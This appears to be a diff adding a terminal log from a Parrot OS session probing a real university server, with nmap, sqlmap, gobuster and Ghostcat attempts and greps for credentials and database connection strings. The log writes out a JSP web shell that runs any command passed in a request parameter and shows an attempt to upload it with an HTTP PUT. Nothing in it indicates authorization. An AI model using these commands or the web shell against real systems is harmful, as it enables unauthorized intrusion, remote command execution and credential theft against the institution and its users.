@@ -1,0 +1,151 @@
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $wget https://sito.utslp.edu.mx/javascript/scriptAnimaciones.js
+--2025-10-03 21:51:56--  https://sito.utslp.edu.mx/javascript/scriptAnimaciones.js
+Resolviendo sito.utslp.edu.mx (sito.utslp.edu.mx)... 189.254.143.102
+Conectando con sito.utslp.edu.mx (sito.utslp.edu.mx)[189.254.143.102]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 10952 (11K) [application/javascript]
+Grabando a: «scriptAnimaciones.js»
+
+scriptAnimaciones.j 100%[===================>]  10.70K  --.-KB/s    en 0.003s  
+
+2025-10-03 21:51:56 (3.10 MB/s) - «scriptAnimaciones.js» guardado [10952/10952]
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $strings scriptAnimaciones.js | grep -i "user\|pass\|config\|database\|jdbc"
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $cd ..
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $curl -X PUT -d "test" "https://sito.utslp.edu.mx/test.txt"
+<html><head><title>Apache Tomcat/6.0.53 - Informe de Error</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>Estado HTTP 403 - </h1><HR size="1" noshade="noshade"><p><b>type</b> Informe de estado</p><p><b>mensaje</b> <u></u></p><p><b>descripción</b> <u>El acceso al recurso especificado ha sido prohibido.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/6.0.53</h3></body></html>┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $
+
+
+─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $echo '<%@ page import="java.io.*" %><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream())); String line = null; while ((line = in.readLine()) != null) { out.println(line); } } %>' > shell.jsp
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $curl -X PUT -d @shell.jsp "https://sito.utslp.edu.mx/shell.jsp"
+
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title> Sistema de Informaci�n T�ctico Operativo </title>
+
+	<link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+	<link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+	<link rel="stylesheet" href="/styles2/cells.css" type="text/css">
+	<link rel="stylesheet" href="/styles2/characters.css" type="text/css">
+</head>
+
+<body>
+<form name="forma" method="post" action="">
+	<br>
+	<table class="TablaDatosTitulo" width="100%" align="center" cellpadding="0" cellspacing="0">
+		  <th class="CeldaDatosTitulo"> Error 404</th>
+	</table>
+	<table border="0" width="100%" align="center" cellpadding="0" cellspacing="0">
+		<colgroup>
+			<col width="20%"> <col width="80%">
+		</colgroup>	
+		<tr class="CeldaDatos">
+			<td colspan="2">&nbsp;  </td>
+		</tr>
+		<tr class="CeldaDatos">
+			<td align="center"> <img src="/images/error404.png"> </td>
+			<td><b> Error 404, p�gina no encontrada, por favor reportarlo al departamento de Sistemas Inform�ticos</b></td>
+		</tr>
+		<tr class="CeldaDatos">
+			<td colspan="2">&nbsp;  </td>
+		</tr>
+	</table>
+</form>
+</body>
+</html>┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $
+
+
+
+
+─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/NMap]
+└──╼ $sudo nmap -sS -sV -sC -p- -T4 -A -oN full_scan.txt sito.utslp.edu.mx
+[sudo] contraseña para marcos_os: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-03 21:50 CST
+Nmap scan report for sito.utslp.edu.mx (189.254.143.102)
+Host is up (0.019s latency).
+rDNS record for 189.254.143.102: utslp.edu.mx
+Not shown: 65532 filtered tcp ports (no-response)
+PORT    STATE  SERVICE  VERSION
+25/tcp  open   smtp?
+|_smtp-commands: SMTP EHLO sito.utslp.edu.mx: failed to receive data: connection closed
+| fingerprint-strings: 
+|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Hello, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|_    452 syntax error (connecting)
+113/tcp closed ident
+443/tcp open   ssl/http Apache Tomcat/Coyote JSP engine 1.1
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache-Coyote/1.1
+| ssl-cert: Subject: commonName=*.utslp.edu.mx
+| Subject Alternative Name: DNS:*.utslp.edu.mx, DNS:utslp.edu.mx
+| Not valid before: 2025-03-12T22:57:40
+|_Not valid after:  2026-04-13T22:57:40
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port25-TCP:V=7.94SVN%I=7%D=10/3%Time=68E09A1B%P=x86_64-pc-linux-gnu%r(H
+SF:ello,1F,"452\x20syntax\x20error\x20\(connecting\)\r\n")%r(Help,1F,"452\
+SF:x20syntax\x20error\x20\(connecting\)\r\n")%r(GenericLines,1F,"452\x20sy
+SF:ntax\x20error\x20\(connecting\)\r\n")%r(GetRequest,1F,"452\x20syntax\x2
+SF:0error\x20\(connecting\)\r\n")%r(HTTPOptions,1F,"452\x20syntax\x20error
+SF:\x20\(connecting\)\r\n")%r(RTSPRequest,1F,"452\x20syntax\x20error\x20\(
+SF:connecting\)\r\n")%r(SSLSessionReq,1F,"452\x20syntax\x20error\x20\(conn
+SF:ecting\)\r\n")%r(TerminalServerCookie,1F,"452\x20syntax\x20error\x20\(c
+SF:onnecting\)\r\n")%r(TLSSessionReq,1F,"452\x20syntax\x20error\x20\(conne
+SF:cting\)\r\n")%r(Kerberos,1F,"452\x20syntax\x20error\x20\(connecting\)\r
+SF:\n")%r(FourOhFourRequest,1F,"452\x20syntax\x20error\x20\(connecting\)\r
+SF:\n")%r(LPDString,1F,"452\x20syntax\x20error\x20\(connecting\)\r\n")%r(L
+SF:DAPSearchReq,1F,"452\x20syntax\x20error\x20\(connecting\)\r\n")%r(SIPOp
+SF:tions,1F,"452\x20syntax\x20error\x20\(connecting\)\r\n");
+OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
+No OS matches for host
+Network Distance: 5 hops
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   4.11 ms  192.168.100.1
+2   6.16 ms  10.64.64.1
+3   12.15 ms 10.180.24.65
+4   12.34 ms 10.180.24.68
+5   11.75 ms utslp.edu.mx (189.254.143.102)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 303.50 seconds
+
+[*] starting @ 21:58:36 /2025-10-03/
+
+[21:58:36] [CRITICAL] host 'sito.utslp.edu.mx' does not exist
+[21:58:36] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 21:58:36 /2025-10-03/
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/ghost]
+└──╼ $for file in $(gobuster dir -u https://sito.utslp.edu.mx/ -w /usr/share/wordlists/dirb/common.txt -x jsp,xml,properties -q | grep -v "404"); do
+    curl -sk "https://sito.utslp.edu.mx/$file" | grep -i "jdbc\|mysql\|oracle\|sqlserver\|connection"
+done
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/ghost]
+└──╼ $nmap -p 8009 --script tomcat-ghostcat sito.utslp.edu.mx
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-03 22:00 CST
+NSE: failed to initialize the script engine:
+/usr/bin/../share/nmap/nse_main.lua:829: 'tomcat-ghostcat' did not match a category, filename, or directory
+stack traceback:
+	[C]: in function 'error'
+	/usr/bin/../share/nmap/nse_main.lua:829: in local 'get_chosen_scripts'
+	/usr/bin/../share/nmap/nse_main.lua:1364: in main chunk
+	[C]: in ?
+
+QUITTING!
+
